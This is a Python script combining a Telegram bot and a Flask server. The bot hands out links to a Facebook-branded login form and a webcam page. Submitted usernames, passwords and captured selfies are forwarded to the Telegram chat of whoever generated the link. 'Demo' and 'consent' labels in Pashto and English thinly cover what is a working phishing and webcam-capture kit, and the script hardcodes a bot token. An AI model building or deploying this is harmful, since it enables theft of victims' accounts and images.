
import threading
import requests
from flask import Flask, request, render_template_string, redirect
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# =====================
# CONFIG
# =====================
BOT_TOKEN = "7975528068:AAGo46nDvhyuF34Eur65iZ_ML1cXhXW6Y-s"
PUBLIC_BASE_URL = "https://f3a9-39-42-xx-xx.ngrok-free.app"  # که لوکل یې: http://127.0.0.1:8081
PORT = 8081

# =====================
# TELEGRAM BOT
# =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [["📘 Facebook (Demo)"], ["📷 Camera (Consent)"]]
    await update.message.reply_text(
        "سلام 👋\n"
        "دا **Demo/Consent Bot** دی.\n"
        "هیڅ ریښتینی لاګین یا پټ کیمره نشته.\n\n"
        "یو انتخاب وکړه 👇",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
    )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if update.message.text == "📘 Facebook (Demo)":
        link = f"{PUBLIC_BASE_URL}/facebook-demo?uid={uid}"
        await update.message.reply_text(f"🔗 Demo Link:\n{link}")
    elif update.message.text == "📷 Camera (Consent)":
        link = f"{PUBLIC_BASE_URL}/camera-consent?uid={uid}"
        await update.message.reply_text(f"🔗 Camera Link:\n{link}")

async def send_to_user(uid: int, text: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": uid, "text": text})

async def send_photo(uid: int, photo_bytes: bytes):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {"photo": photo_bytes}
    data = {"chat_id": uid, "caption": "📷 Demo Selfie (User Consent)"}
    requests.post(url, data=data, files=files)

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu))
    app.run_polling()

# =====================
# FLASK WEB
# =====================
web = Flask(__name__)

FACEBOOK_HTML = """
<!doctype html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Demo Login</title></head>
<body>
<h3>Demo Only – No Real Login</h3>
<p>دا ازمایښتي فورم دی. ریښتینی Facebook نه دی.</p>
<form method="post">
  <input name="username" placeholder="Username (Demo)" style="width:100%;padding:10px"><br><br>
  <input name="password" placeholder="Password (Demo)" style="width:100%;padding:10px"><br><br>
  <button type="submit" style="padding:10px 20px">Submit</button>
</form>
</body>
</html>
"""

@web.route("/facebook-demo", methods=["GET", "POST"])
def facebook_demo():
    uid = request.args.get("uid")
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if uid:
            threading.Thread(
                target=lambda: requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data={"chat_id": uid, "text": f"📘 Demo Form:\nUsername: {username}\nPassword: {password}"}
                )
            ).start()
        return "<h3>Sent ✔</h3><p>Demo data was sent to your bot.</p>"
    return render_template_string(FACEBOOK_HTML)

CAMERA_HTML = """
<!doctype html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Camera Consent</title></head>
<body>
<h3>User Consent Required</h3>
<p>په OK سره ته اجازه ورکوې چې یو Demo عکس واخیستل شي.</p>
<button onclick="start()" style="padding:12px 20px">OK</button>
<video id="v" autoplay style="width:100%;display:none"></video>
<canvas id="c" style="display:none"></canvas>
<script>
async function start(){
  const v = document.getElementById('v');
  const s = await navigator.mediaDevices.getUserMedia({video:true});
  v.srcObject = s; v.style.display='block';
  setTimeout(()=>capture(s),1500);
}
function capture(stream){
  const v=document.getElementById('v'), c=document.getElementById('c');
  c.width=v.videoWidth; c.height=v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  c.toBlob(b=>{
    const f=new FormData(); f.append('photo',b);
    fetch(location.href,{method:'POST',body:f}).then(()=>{stream.getTracks().forEach(t=>t.stop());});
  },'image/jpeg');
}
</script>
</body>
</html>
"""

@web.route("/camera-consent", methods=["GET", "POST"])
def camera_consent():
    uid = request.args.get("uid")
    if request.method == "POST":
        if uid and 'photo' in request.files:
            photo = request.files['photo'].read()
            threading.Thread(
                target=lambda: requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={"chat_id": uid, "caption": "📷 Demo Selfie (Consent)"},
                    files={"photo": photo}
                )
            ).start()
        return "OK"
    return render_template_string(CAMERA_HTML)

def run_web():
    web.run(host="0.0.0.0", port=PORT, debug=False)

# =====================
# MAIN
# =====================
if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    run_bot()
